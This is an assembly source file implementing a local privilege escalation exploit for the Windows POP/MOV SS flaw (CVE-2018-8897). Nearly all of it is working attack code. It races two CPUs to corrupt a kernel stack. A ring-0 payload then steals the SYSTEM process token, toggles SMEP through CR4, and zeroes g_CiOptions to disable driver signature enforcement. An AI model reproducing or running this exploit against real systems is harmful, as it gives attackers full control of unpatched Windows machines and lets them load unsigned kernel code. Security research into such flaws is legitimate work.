;
;	Module Name:
;		asm.asm
;	
;	Abstract:
;		Implements the POP/MOV SS (CVE-2018-8897) vulnerability by utilizing
;		SYSCALL to gain system privileges from a limited application (local
;		privilege escalation).
;
;	Authors:
;		Nick Peterson <everdox@gmail.com> | http://everdox.net/
;		Nemanja (Nemi) Mulasmajic <nm@triplefault.io> | http://triplefault.io/
;

.code

; ===================================================================
; Expose the globals defined in movss_popss.cpp to ASM.
extern _StackSelector: word
extern _CopyStackSelector: qword

extern _CPU0StackPointer: qword
extern _CPU1Ready: byte

extern _SpoofedGSBase: qword

extern RestoreToUsermode: proc

extern _NtoskrnlBaseAddress: qword
extern _CiBaseAddress: qword
extern _PsInitialSystemProcessOffset: qword
extern _ExAllocatePoolWithTagOffset: qword
extern _g_CiOptionsOffset: qword
extern _CurrentThreadOffset: qword
extern _CurrentProcessOffset: qword
extern _ProcessTokenOffset: qword
; ===================================================================

; ===================================================================
; Store the SS selector value into the user-specified argument.
; ===================================================================
__store_ss PROC
	mov [rcx], ss
	ret
__store_ss ENDP

; ===================================================================
; Change the GSBASE to the user-specified value.
; ===================================================================
__writegsbase PROC
	wrgsbase rcx
	ret
__writegsbase ENDP

; ===================================================================
; Read GSBASE.
; ===================================================================
__readgsbase PROC
	rdgsbase rax
	ret
__readgsbase ENDP

; ===================================================================
; Execute the POP/MOV SS exploit on CPU0.
; ===================================================================
AsmExecuteExploit PROC
	; For the kernel stack - to ensure we don't clobber anything in 
	; usermode.
	sub rsp, 3000h
		
	; CPU1 will probe this stack pointer that CPU0 will transition
	; into kernelmode on.
	mov [_CPU0StackPointer], rsp
	mfence

	; Wait until CPU1 is ready.
NotReady:
	cmp [_CPU1Ready], 1
	je Ready
	pause
	jmp NotReady

Ready:
	
	; For debugging...
	;spin:
	;jmp spin

	mov rcx, [_SpoofedGSBase]
	wrgsbase rcx

	; Now, that CPU1 is ready to corrupt the stack of CPU0,
	; let's execute CVE-2018-8897 on CPU0.
	mov ss, [_StackSelector]

	; By executing 'syscall', we will get to KiSystemCall64, but not
	; execute any of the logic there since we will be interrupted by the
	; suppressed #DB. This will cause us to enter KiDebugTrapOrFault with
	; a usermode defined stack pointer and a GSBASE of whatever we want.
	syscall

	mov rsp, [_CPU0StackPointer]
	add rsp, 3000h
	ret
AsmExecuteExploit ENDP

; ===================================================================
; This is the user-specified payload that executes with ring0 
; privileges.
;
; We disable SMEP, steal the system token, and disable DSE>
; ===================================================================
AsmKernelPayload PROC
	mov rsp, [_CPU0StackPointer]

	; Swap to a valid kernelmode GSBASE.
	swapgs
	
	mov rax, qword ptr [_NtoskrnlBaseAddress]
	add rax, qword ptr [_ExAllocatePoolWithTagOffset]

	xor r8, r8
	mov rdx, 100h
	xor rcx, rcx ; NonPagedPool
	call rax
	mov r8, rax

	mov rax, 014e8ba0f48e0200fh ; mov rax, cr4 # bts rax, 14h
	mov [r8], rax
	
	mov rax, 0909090cf48e0220fh ; mov cr4, rax # iretq # nop # nop # nop
	mov [r8+8], rax

	; Grab the _KPCR.Prcb.CurrentThread offset. 
	mov rcx, qword ptr [_CurrentThreadOffset]
	
	; rax contains "CurrentThread" read from gs (_KPCR.Prcb.CurrentThread).
	mov rax, qword ptr gs:[rcx]
	
	; Grab the _KTHREAD.ApcState.Process offset.
	mov rcx, qword ptr [_CurrentProcessOffset]
	
	; rax contains the "CurrentProcess" (_KTHREAD.ApcState.Process).
	mov rax, [rax + rcx]
	
	; Grab the _EPROCESS.Token offset.
	mov rcx, qword ptr [_ProcessTokenOffset]
	
	; rax contains the address of _EPROCESS.Token.
	lea rax, [rax + rcx]
	
	; Grab the PsInitialSystemProcess.
	mov rdx, qword ptr [_NtoskrnlBaseAddress]
	add rdx, qword ptr [_PsInitialSystemProcessOffset]
	mov rdx, [rdx]
	
	; Extract the _EPROCESS.Token from the "SystemProcess".
	mov rdx, [rdx + rcx]
	
	; Replace the "CurrentProcess" Token with the "SystemProcess" token.
	mov [rax], rdx

	; Now let's fix disable DSE by altering _g_CiOptions.
	mov rax, [_CiBaseAddress]
	add rax, [_g_CiOptionsOffset]
	mov dword ptr [rax], 0

	swapgs

	; SS
	push qword ptr [_CopyStackSelector]

	; RSP
	mov rax, qword ptr [_CPU0StackPointer]
	add rax, 3000h
	push rax

	; IF
	pushfq
	or qword ptr [rsp], 0200h ; Re-enable interrupts

	; CS
	push 033h

	; RIP
	lea rax, RestoreToUsermode
	push rax

	; Restore SMEP and IRET back to usermode code.
	jmp r8
AsmKernelPayload ENDP

; ===================================================================
; Continuously overwrite the user-specified memory location with the
; user-specified value.
; 
; This executes on CPU1.
; ===================================================================
AsmClobberValue PROC
top:
	mov [rcx], rdx
	jmp top
AsmClobberValue ENDP

END